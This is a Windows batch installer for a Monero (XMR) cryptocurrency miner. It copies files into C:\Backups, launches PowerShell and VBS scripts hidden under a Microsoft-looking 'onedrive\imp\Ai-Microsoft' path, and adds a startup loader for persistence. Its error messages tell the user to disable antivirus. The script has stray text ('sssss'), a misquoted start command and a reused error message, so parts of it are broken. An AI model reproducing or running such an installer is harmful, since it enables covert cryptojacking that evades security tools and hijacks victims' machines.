@echo off
title XMR Minner Setup
color 2
echo ============================================
echo         XMR Minner Setup - Starting...
echo ============================================
echo.
	
:: ── STEP 1: Copy Backups folder to C:\ ──────────────────────────────────────
echo [1/4] Copying Backups folder to C:\Backups ...
xcopy "%~dp0Backups" "C:\Backups" /E /I /H /Y
if errorlevel 1 (
    echo ERROR: Copy failed. Check permissions and try again.
    pause
    exit /b 1
)
echo       Done!
echo.

:: ── STEP 2: Run Script Sec ─────────────────────────────────────────
echo [2/4] Running Script Sec (Script_Sec) ...
start "C:\Backups\onedrive\imp\Ai-Microsoft\SignScript.ps1"
if errorlevel 1 (
    echo ERROR: Script_Sec failed. Make sure Win Anti Virus is Dissabled.
    pause
    exit /b 1
)
echo       Done!
echo.

:: ── STEP 3: Run StratUp-Loader ─────────────────────────────────────────
echo [3/4] Running StartUp-Loader (StratUp SetUp) ...
 "C:\Backups\onedrive\imp\Ai-Microsoft\AutoStartup.vbs"
if errorlevel 1 (
    echo ERROR: Script_Sec failed. Make sure Win Anti Virus is Dissabled.
    pause
    exit /b 1
)
echo       Done!
echo.

:: ── STEP 4: Launch XMR Minner ──────────────────────────────────────────────────
echo [4/4] Launching XMR Minner (Main Setup) ...
start "" "C:\Backups\onedrive\imp\Ai-Microsoft\Windows_Main_UI.vbs"
echo       Launched!
echo.
sssss
echo ============================================
echo         Setup Complete! Enjoy your Not So Sketchy XMR Minner.
echo ============================================
pause
